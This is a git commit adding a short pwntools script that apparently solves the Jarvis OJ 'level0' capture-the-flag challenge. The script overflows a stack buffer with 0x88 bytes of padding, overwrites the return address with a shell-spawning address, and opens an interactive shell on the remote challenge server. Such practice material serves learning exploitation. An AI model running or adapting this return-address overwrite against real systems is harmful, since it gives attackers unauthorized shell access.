d342a5f5f2f4dd6c23c928a58104e314e8f9619f
CHU-YUN-FEI <45117488+CHU-YUN-FEI@users.noreply.github.com>
2019-07-10 15:11:24 +0800

    leve0

---
+++ leve0/python.py
@@ -0,0 +1,38 @@
+#!/usr/bin/env python
+# coding=utf-8
+# author:muhe
+# http://www.cnblogs.com/0xmuhe/
+from pwn import *
+################# 
+
+'''
+p = process('level0.b9ded3801d6dd36a97468e128b81a65d')
+junk = "A"*0x88		#栈溢出长度
+addr1= 0x400596  #bin/sh地址
+payload = ''
+payload+=junk
+payload+=p64(addr1)
+p.send(payload)
+
+#################m
+
+'''
+p = remote('pwn2.jarvisoj.com',9881)
+junk = "A"*0x88
+addr1= 0x400596
+
+payload = ''
+payload+=junk
+payload+=p64(addr1)
+p.send(payload)
+
+
+#################
+
+
+
+
+
+
+
+p.interactive()
